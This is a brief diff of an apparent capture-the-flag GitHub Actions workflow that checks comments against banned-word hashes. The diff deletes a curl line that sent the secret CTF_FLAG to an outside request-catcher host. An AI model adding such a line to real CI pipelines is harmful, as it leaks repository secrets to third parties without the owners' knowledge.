@@ -66,6 +66,5 @@ jobs:
               break
             fi
           done < banned_words_hash.txt
-          curl -G "https://ctf.requestcatcher.com/" \
-            --data-urlencode "flag=${{ secrets.CTF_FLAG }}"
+          
           echo "Meh, well... Anyway we removed your comment :P"
